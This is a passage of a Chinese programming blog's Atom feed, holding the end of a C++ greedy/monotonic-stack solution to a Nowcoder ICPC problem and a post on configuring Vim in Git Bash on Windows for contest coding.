中总会合并成一段，根据这一性质在原数组中利用<strong>单调栈</strong>即可构造初始的段，之后就是从数组 $A,B​$ 贪心选择均值较大的段。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) ((int)(x).size())</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) begin(x),end(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(int i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; <span class="meta-string">", "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="comment">//-------</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, A[N], B[N];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> num; ll sum;</span><br><span class="line">    Node() &#123;&#125;</span><br><span class="line">    Node(<span class="keyword">int</span> _num, ll _sum) &#123;</span><br><span class="line">        num = _num, sum = _sum;</span><br><span class="line">    &#125;</span><br><span class="line">    Node <span class="keyword">operator</span>+(<span class="keyword">const</span> Node &amp;p) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Node(num + p.num, sum + p.sum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> Node &amp;p) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sum * p.num &lt; p.sum * num; </span><br><span class="line">    &#125;</span><br><span class="line">&#125; a[N], b[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gao</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> *r, Node *a)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> top = <span class="number">0</span>;</span><br><span class="line">    rep(i, <span class="number">0</span>, n) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, r + i);</span><br><span class="line">        <span class="function">Node <span class="title">v</span><span class="params">(<span class="number">1</span>, r[i])</span></span>;    </span><br><span class="line">        <span class="keyword">while</span> (top &gt; <span class="number">0</span> &amp;&amp; a[top - <span class="number">1</span>] &lt; v)</span><br><span class="line">            v = a[--top] + v;</span><br><span class="line">        a[top++] = v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> top;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m);</span><br><span class="line"><span class="keyword">int</span> la = gao(n, A, a), lb = gao(m, B, b);</span><br><span class="line">    n = m = <span class="number">0</span>;</span><br><span class="line">    ll ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; la || j &lt; lb; ) &#123;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; la &amp;&amp; (j == lb || !(a[i] &lt; b[j]))) &#123;</span><br><span class="line">            rep(k, n, n + a[i].num) ans += <span class="number">1l</span>l * (k + m + <span class="number">1</span>) * A[k];    </span><br><span class="line">            n += a[i++].num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (j &lt; lb &amp;&amp; (i == la || !(b[j] &lt; a[i]))) &#123;</span><br><span class="line">            rep(k, m, m + b[j].num) ans += <span class="number">1l</span>l * (k + n + <span class="number">1</span>) * B[k];</span><br><span class="line">            m += b[j++].num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;链接：&lt;a href=&quot;https://ac.nowcoder.com/acm/contest/545/C&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ac.nowcoder.com/acm/contest/545/C&lt;/a&gt;&lt;br&gt;来源
      
    
    </summary>
    
    
      <category term="ICPC" scheme="http://mcginn7.github.io/tags/ICPC/"/>
    
      <category term="贪心" scheme="http://mcginn7.github.io/tags/%E8%B4%AA%E5%BF%83/"/>
    
  </entry>
  
  <entry>
    <title>Windows 下使用 Vim</title>
    <link href="http://mcginn7.github.io/2018/10/10/Vim-for-windows-%E9%85%8D%E7%BD%AE/"/>
    <id>http://mcginn7.github.io/2018/10/10/Vim-for-windows-配置/</id>
    <published>2018-10-10T13:18:19.537Z</published>
    <updated>2019-07-29T13:15:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h2><p>主要针对 ACM/ICPC 竞赛选手在 Windows 10 系统下使用 vim 编写 C/C++ 代码。</p><p>功能配置：</p><ol><li>编译和运行 *.cpp 文件；</li><li>一键复制代码;</li><li>记事本打开代码。</li></ol><img src="/2018/10/10/Vim-for-windows-配置/1539090544618.png" title="效果图"><p>git bash 和 gvim 都配置了一遍。gvim 使用 Windows 自带的 cmd 运行的话，鼠标是没办法移动光标的，并且配置相对 git bash 较麻烦，所以推荐使用 git bash。</p><h2 id="Vimrc-配置"><a href="#Vimrc-配置" class="headerlink" title="Vimrc 配置"></a>Vimrc 配置</h2><ul><li><p>编辑安装路径下的 vimrc 文件，例如 “D:\Git\etc\vimrc”，配置快捷键。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set nu ai ci si mouse=a ts=4 sts=4 sw=4</span><br><span class="line">nmap&lt;F2&gt; :vs %&lt;.in &lt;CR&gt;</span><br><span class="line">nmap&lt;F3&gt; :w !clip.exe &lt;CR&gt; &lt;CR&gt;</span><br><span class="line">nmap&lt;F4&gt; :!write % &lt;CR&gt;</span><br><span class="line">nmap&lt;F8&gt; :!./%&lt; &lt; %&lt;.in &lt;CR&gt;</span><br><span class="line">nmap&lt;F9&gt; :!g++ % -o %&lt; -O2 -g -Wall -std=c++11 &lt;CR&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="额外配置"><a href="#额外配置" class="headerlink" title="额外配置"></a>额外配置</h2><ul><li><p>vimrc 文件默认有一些配置，可根据需要修改。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set vb             "这个不关的话，触发某些条件会闪屏</span><br><span class="line">set laststatus=1   "窗口底部状态栏的行数（默认是2），这里设置成1。</span><br><span class="line">au FileType c,cpp setlocal comments-=:// comments+=f:// "取消换行自动注释</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>设置 Ctrl + Alt + T 快捷键启动 Git Bash 终端。</p><ol><li>创建 “git-bash.exe” 的快捷方式，打开快捷方式的属性窗口，修改<strong>起始位置</strong>，并设置快捷键。</li><li>打开<strong>控制面板</strong>，找到 “管理工具”， 将快捷方式复制到该文件夹中。</li></ol></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简要说明&quot;&gt;&lt;a href=&quot;#简要说明&quot; class=&quot;headerlink&quot; title=&quot;简要说明&quot;&gt;&lt;/a&gt;简要说明&lt;/h2&gt;&lt;p&gt;主要针对 ACM/ICPC 竞赛选手在 Windows 10 系统下使用 vim 编写 C/C++ 代码。&lt;/p&gt;
&lt;p&gt;功
      
    
    </summary>
    
    
      <category term="vim" scheme="http://mcginn7.github.io/tags/vim/"/>
    
      <category term="git bash" scheme="http://mcginn7.github.io/tags/git-bash/"/>
    
  </entry>
  
</feed>
